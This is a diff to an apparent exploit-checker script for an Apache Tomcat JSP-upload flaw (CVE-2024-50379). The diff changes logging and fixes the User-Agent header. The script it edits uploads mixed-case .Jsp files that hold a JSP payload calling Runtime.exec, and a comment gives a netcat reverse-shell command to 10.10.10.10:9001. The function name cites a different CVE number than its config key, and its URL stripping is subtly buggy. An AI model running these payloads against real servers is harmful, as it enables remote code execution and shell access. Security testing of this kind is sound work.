@@ -33,7 +33,7 @@ def check_cve_2024_50739(url, config):
     target_port = config['CVE-2024-50379']['port']
     for protocol in protocols:
         target_url = urljoin(protocol + url.lstrip('http://').lstrip('https://'), "/")
-        print(f"Checking {target_url}...")
+        logging.info(f"Checking {target_url}...")
 
         target_url_put1 = urljoin(target_url, "/aa.Jsp")
         target_url_put2 = urljoin(target_url, "/bb.Jsp")
@@ -41,12 +41,12 @@ def check_cve_2024_50739(url, config):
         target_url_get2 = urljoin(target_url, "/bb.jsp")
 
         headers1 = {
-            "User-Agent": getRandomUserAgent(),
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
             "Content-Type": "application/json"
         }
 
         headers2 = {
-            "User-Agent": getRandomUserAgent(),
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
         }
         # nc.exe 10.10.10.10 9001 -e sh
         payload_put = "aa<% Runtime.getRuntime().exec(\"calc.exe\");%>"
@@ -72,7 +72,7 @@ def check_cve_2024_50739(url, config):
                         logging.info(f"\033[31mResponse status: {response.status_code}\033[0m")
                         found_vulnerabilities = True
             except Exception as e:
-                print(f"Error occurred: {e}")
+                logging.warning(f"Error occurred: {e}")
                 return False, None, None
 
         if found_vulnerabilities:
